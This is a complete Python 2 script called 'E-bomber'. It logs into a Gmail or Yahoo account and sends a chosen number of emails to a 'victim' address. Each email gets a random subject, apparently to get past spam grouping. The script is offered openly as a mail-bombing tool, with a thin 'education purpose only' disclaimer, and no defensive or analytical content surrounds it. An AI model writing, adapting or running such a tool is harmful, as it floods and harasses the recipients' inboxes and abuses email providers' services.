#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys


server = raw_input ('Gmail or Yahoo: ')
user = raw_input('Email,this will be displayed to the victim: ')
passwd = getpass.getpass('Password for your above gmail/yahoo: ')


to = raw_input('\nEmail to be bombed: ')
#subject = raw_input('Subject: ') 
body = raw_input('Message for bomber: ')
total = input('No of mail: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rBomb planted: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Bombed successfully'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] email or password you entered is incorrect.'
    sys.exit()
